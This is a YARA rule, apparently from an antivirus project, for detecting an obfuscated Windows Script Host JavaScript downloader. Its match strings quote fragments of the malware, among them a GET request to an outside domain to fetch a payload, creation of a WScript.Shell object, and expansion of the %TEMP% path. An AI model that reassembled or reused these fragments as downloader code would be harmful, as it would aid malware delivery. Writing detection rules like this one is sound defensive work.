rule sig_20160427_924f2d11802d85b429db8cb9f1f58d53 {
  meta:
    description = "datamaliciousorder - file 20160427_924f2d11802d85b429db8cb9f1f58d53.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "dbb0f39b5781ce587cb1b19804c40ba5ebbd6dd7da4b70fa38a0caa0e280badf"

  strings:
    $s1  = "CvsvkMlung[BwsysYnoue](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function HpupkNbcsl() {return UmrxqQvbah[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"SJD519B" ascii
    $s3  = "function HpupkNbcsl() {return UmrxqQvbah[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"SJD519B" ascii
    $s4  = "function YxcedHftpg() {return ((IwzvnOcmqy == true) && (IwzvnOcmqy == HzchbCnrva)) ? 1 : PdhbbTbttn;};" fullword ascii
    $s5  = "function VxmzkAgvxz(JslrlLxudf, ItnpaUzukb){PdhbbTbttn = PdhbbTbttn * 1; return JslrlLxudf - ItnpaUzukb;};" fullword ascii
    $s6  = "var UmrxqQvbah = function KvvjqTcsfz() {return QmjmbRgnym[ZpfosEjxiy](\"WScript\"+\".Shell\");}(), EgdieRfyxc = 11;" fullword ascii
    $s7  = "var QmjmbRgnym = this[\"WScript\"];" fullword ascii
    $s8  = "function KoslfWczsp(){return RhuxwLnxwe + \"\";};" fullword ascii
    $s9  = "if (CvsvkMlung[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "var PbwmcCbynt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "IwzvnOcmqy = true; " fullword ascii
    $s12 = "function OdvwrJjbjl(RqlbpTsqye) {var ExguqVvnrs = (1, 2, 3, 4, 5, RqlbpTsqye); return ExguqVvnrs;};" fullword ascii
    $s13 = "function NedjdPdytg(){return 23;};" fullword ascii
    $s14 = "return VxmzkAgvxz(YngeiEklvn, CmjpjGctpm);" fullword ascii
    $s15 = "function WgjzfGsctx(){return ZpfosEjxiy;};" fullword ascii
    $s16 = "var IwzvnOcmqy = false;" fullword ascii
    $s17 = "function TikbxKfygh()" fullword ascii
    $s18 = "PeolaFdnvi = true;" fullword ascii
    $s19 = "var PeolaFdnvi = false;" fullword ascii
    $s20 = "HzchbCnrva = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}